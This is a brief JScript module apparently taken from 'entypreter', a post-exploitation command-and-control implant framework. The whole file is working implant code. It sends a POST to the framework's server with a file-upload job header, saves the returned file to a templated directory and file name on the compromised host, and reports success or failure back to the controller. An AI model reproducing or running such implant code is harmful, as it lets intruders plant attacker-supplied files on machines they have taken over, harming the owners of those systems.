try
{
    var headers = {};
    headers["X-UploadFileJob"] = "true";
    var path = entypreter.file.getPath( "~DIRECTORY~\\~FILE~");

    entypreter.http.downloadEx("POST", entypreter.work.make_url(), headers, path);
    entypreter.work.report("Completed");
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
